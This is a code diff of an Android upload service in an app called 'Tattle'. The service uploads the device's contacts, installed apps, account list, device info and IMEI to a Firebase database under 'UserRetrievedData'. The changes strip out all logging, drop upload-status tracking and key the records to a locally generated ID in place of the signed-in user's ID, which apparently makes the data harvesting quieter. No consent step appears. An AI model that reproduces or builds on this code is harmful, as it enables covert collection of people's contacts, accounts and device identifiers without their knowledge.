@@ -3,7 +3,6 @@ package com.globalsolutions.Tattle.DataUploadServices;
 import android.accounts.Account;
 import android.content.Context;
 import android.content.Intent;
-import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.core.app.JobIntentService;
@@ -13,6 +12,7 @@ import com.globalsolutions.Tattle.Models.InstalledApps;
 import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -28,6 +28,8 @@ public class BasicDataUploadService extends JobIntentService {
     FirebaseAuth firebaseAuth;
     SharedPrefs sharedPrefs;
 
+    int count=0;
+
     public static void enqueueWork(Context context, Intent work) {
         enqueueWork(context, BasicDataUploadService.class, 123, work);
     }
@@ -36,6 +38,7 @@ public class BasicDataUploadService extends JobIntentService {
     public void onCreate() {
         super.onCreate();
         sharedPrefs = SharedPrefs.getInstance(this);
+        FirebaseApp.initializeApp(this);
         firebaseDatabase = FirebaseDatabase.getInstance();
         firebaseAuth = FirebaseAuth.getInstance();
         databaseReference = firebaseDatabase.getReference();
@@ -43,7 +46,6 @@ public class BasicDataUploadService extends JobIntentService {
 
     @Override
     protected void onHandleWork(@NonNull Intent intent) {
-        Log.i(TAG, "onHandleWork: " + "working");
         List<ContactsInfo> contactsInfoList = (List<ContactsInfo>) intent.getSerializableExtra("contacts");
         List<InstalledApps> installedAppsList = (List<InstalledApps>) intent.getSerializableExtra("installedApps");
         List<Account> accountList = (List<Account>) intent.getSerializableExtra("accounts");
@@ -51,77 +53,65 @@ public class BasicDataUploadService extends JobIntentService {
         String deviceImei = intent.getStringExtra("imei");
 
         if (contactsInfoList != null) {
-            databaseReference.child("UserRetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
-                    sharedPrefs.saveBasicDataUploaded(true);
-                    Log.i(TAG, "onSuccess: "+"contacts posted");
+                    count++;
                 }
             }).addOnFailureListener(new OnFailureListener() {
                 @Override
                 public void onFailure(@NonNull Exception e) {
-                    sharedPrefs.saveBasicDataUploaded(false);
-                    Log.i(TAG, "onFailure: " + e.getMessage());
                 }
             });
         }
         if (installedAppsList != null) {
-            databaseReference.child("UserRetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
-                    sharedPrefs.saveBasicDataUploaded(true);
-                    Log.i(TAG, "onSuccess: " + "Installed Apps posted");
+                    count++;
                 }
             }).addOnFailureListener(new OnFailureListener() {
                 @Override
                 public void onFailure(@NonNull Exception e) {
-                    sharedPrefs.saveBasicDataUploaded(false);
-                    Log.i(TAG, "onFailure: " + e.getMessage());
                 }
             });
         }
 
         if (deviceInfo != null) {
-            databaseReference.child("UserRetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
-                    sharedPrefs.saveBasicDataUploaded(true);
-                    Log.i(TAG, "onSuccess: "+"DeviceInfo posted");
+                    count++;
                 }
             }).addOnFailureListener(new OnFailureListener() {
                 @Override
                 public void onFailure(@NonNull Exception e) {
-                    sharedPrefs.saveBasicDataUploaded(false);
-                    Log.i(TAG, "onFailure: " + e.getMessage());
                 }
             });
         }
 
         if (accountList != null) {
-            databaseReference.child("UserRetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
-                    sharedPrefs.saveBasicDataUploaded(true);
-                    Log.i(TAG, "onSuccess: "+"AccountList posted");
+                    count++;
                 }
             }).addOnFailureListener(new OnFailureListener() {
                 @Override
                 public void onFailure(@NonNull Exception e) {
-                    sharedPrefs.saveBasicDataUploaded(false);
-                    Log.i(TAG, "onFailure: " + e.getMessage());
                 }
             });
         }
+
         if (deviceImei != null && !deviceImei.isEmpty()) {
-            databaseReference.child("UserRetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("DeviceIMEI").setValue(deviceImei).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("DeviceIMEI").setValue(deviceImei).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
-                    sharedPrefs.saveBasicDataUploaded(true);
+                    count++;
                 }
             }).addOnFailureListener(new OnFailureListener() {
                 @Override
                 public void onFailure(@NonNull Exception e) {
-                    sharedPrefs.saveBasicDataUploaded(false);
                 }
             });
         }
@@ -129,13 +119,12 @@ public class BasicDataUploadService extends JobIntentService {
 
     @Override
     public void onDestroy() {
-        Log.i(TAG, "onDestroy: ");
         super.onDestroy();
+//        sharedPrefs.basicDataUploaded(count == 5);
     }
 
     @Override
     public boolean onStopCurrentWork() {
-        Log.i(TAG, "onStopCurrentWork: ");
         return super.onStopCurrentWork();
     }
 
